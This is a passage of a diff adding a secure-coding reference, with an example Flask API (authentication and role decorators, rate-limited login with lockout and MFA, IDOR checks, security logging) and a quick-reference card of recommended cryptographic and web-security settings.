+        default_limits=["100 per minute"]
+    )
+    
+    # ===================
+    # LOGGING SETUP
+    # ===================
+    
+    class SecurityLogger:
+        def __init__(self):
+            self.logger = logging.getLogger('security')
+            handler = logging.FileHandler('security.log')
+            handler.setFormatter(logging.Formatter(
+                '%(asctime)s - %(levelname)s - %(message)s'
+            ))
+            self.logger.addHandler(handler)
+            self.logger.setLevel(logging.INFO)
+        
+        def log_auth_event(self, event_type: str, user_id: str = None, 
+                           success: bool = True, details: dict = None):
+            """Log authentication events"""
+            log_data = {
+                'event': event_type,
+                'user_id': user_id,
+                'success': success,
+                'ip': request.remote_addr,
+                'user_agent': request.user_agent.string[:200],
+                'timestamp': datetime.utcnow().isoformat(),
+                'details': details or {}
+            }
+            if success:
+                self.logger.info(f"AUTH: {log_data}")
+            else:
+                self.logger.warning(f"AUTH_FAILURE: {log_data}")
+    
+    security_log = SecurityLogger()
+    
+    # ===================
+    # AUTHENTICATION
+    # ===================
+    
+    def login_required(f):
+        """Decorator to require authentication"""
+        @wraps(f)
+        def decorated(*args, **kwargs):
+            token = request.headers.get('Authorization', '').replace('Bearer ', '')
+            
+            if not token:
+                return jsonify({'error': 'Authentication required'}), 401
+            
+            user = validate_session(token)
+            if not user:
+                return jsonify({'error': 'Invalid or expired session'}), 401
+            
+            g.current_user = user
+            return f(*args, **kwargs)
+        return decorated
+    
+    def role_required(*roles):
+        """Decorator to require specific roles"""
+        def decorator(f):
+            @wraps(f)
+            @login_required
+            def decorated(*args, **kwargs):
+                if g.current_user.role not in roles:
+                    security_log.log_auth_event(
+                        'access_denied',
+                        user_id=g.current_user.id,
+                        success=False,
+                        details={'required_roles': roles, 'user_role': g.current_user.role}
+                    )
+                    return jsonify({'error': 'Forbidden'}), 403
+                return f(*args, **kwargs)
+            return decorated
+        return decorator
+    
+    # ===================
+    # API ENDPOINTS
+    # ===================
+    
+    @app.route('/api/login', methods=['POST'])
+    @limiter.limit("5 per minute")
+    def login():
+        """Secure login endpoint"""
+        data = request.get_json()
+        
+        if not data:
+            return jsonify({'error': 'Invalid request'}), 400
+        
+        email = data.get('email', '').strip().lower()
+        password = data.get('password', '')
+        
+        # Validate input
+        if not email or not password:
+            return jsonify({'error': 'Email and password required'}), 400
+        
+        # Check lockout
+        lockout_manager = AccountLockoutManager(redis_client)
+        is_locked, message = lockout_manager.is_locked(email)
+        if is_locked:
+            security_log.log_auth_event('login_locked', user_id=email, success=False)
+            return jsonify({'error': message}), 429
+        
+        # Authenticate
+        user = User.query.filter_by(email=email).first()
+        
+        if not user or not verify_password(password, user.password_hash):
+            lockout_manager.record_failure(email)
+            security_log.log_auth_event('login_failed', user_id=email, success=False)
+            return jsonify({'error': 'Invalid credentials'}), 401
+        
+        # Clear failed attempts on success
+        lockout_manager.clear_failures(email)
+        
+        # Check if MFA required
+        if user.mfa_enabled:
+            mfa_token = mfa_flow.initiate_mfa(user.id)
+            return jsonify({
+                'mfa_required': True,
+                'mfa_token': mfa_token
+            }), 200
+        
+        # Create session
+        session_token = session_manager.create_session(user.id)
+        security_log.log_auth_event('login_success', user_id=str(user.id))
+        
+        return jsonify({
+            'token': session_token,
+            'user': user.to_safe_dict()
+        }), 200
+    
+    @app.route('/api/users/<int:user_id>', methods=['GET'])
+    @login_required
+    def get_user(user_id):
+        """Get user with authorization check"""
+        # Authorization: can only view own profile or admin
+        if g.current_user.id != user_id and g.current_user.role != 'admin':
+            security_log.log_auth_event(
+                'idor_attempt',
+                user_id=str(g.current_user.id),
+                success=False,
+                details={'target_user': user_id}
+            )
+            return jsonify({'error': 'Forbidden'}), 403
+        
+        user = User.query.get_or_404(user_id)
+        return jsonify(user.to_safe_dict()), 200
+    
+    @app.route('/api/admin/users', methods=['GET'])
+    @role_required('admin')
+    def list_users():
+        """Admin-only endpoint"""
+        users = User.query.all()
+        return jsonify([u.to_safe_dict() for u in users]), 200
+    
+    # ===================
+    # ERROR HANDLERS
+    # ===================
+    
+    @app.errorhandler(404)
+    def not_found(e):
+        return jsonify({'error': 'Not found'}), 404
+    
+    @app.errorhandler(500)
+    def server_error(e):
+        # Log error but don't expose details
+        app.logger.error(f"Server error: {e}")
+        return jsonify({'error': 'Internal server error'}), 500
+    
+    @app.errorhandler(429)
+    def rate_limit_exceeded(e):
+        return jsonify({'error': 'Rate limit exceeded'}), 429
+    
+    if __name__ == '__main__':
+        app.run(ssl_context='adhoc')  # Use proper certs in production
+
+# =============================================================================
+# QUICK REFERENCE CARD
+# =============================================================================
+
+quick_reference:
+  password_hashing: "Argon2id with time_cost=3, memory_cost=64MB"
+  session_tokens: "secrets.token_urlsafe(32)  # 256 bits"
+  encryption: "AES-256-GCM with random 96-bit nonce"
+  tls: "TLS 1.2+, prefer 1.3"
+  csp: "default-src 'self'; script-src 'self'; frame-ancestors 'none'"
+  hsts: "max-age=31536000; includeSubDomains; preload"
+  sql: "Always parameterized queries, never string concatenation"
+  xss: "Context-aware output encoding, CSP"
+  rate_limiting: "5 login attempts per minute, progressive lockout"
+  mfa: "TOTP with 30-second window, backup codes"
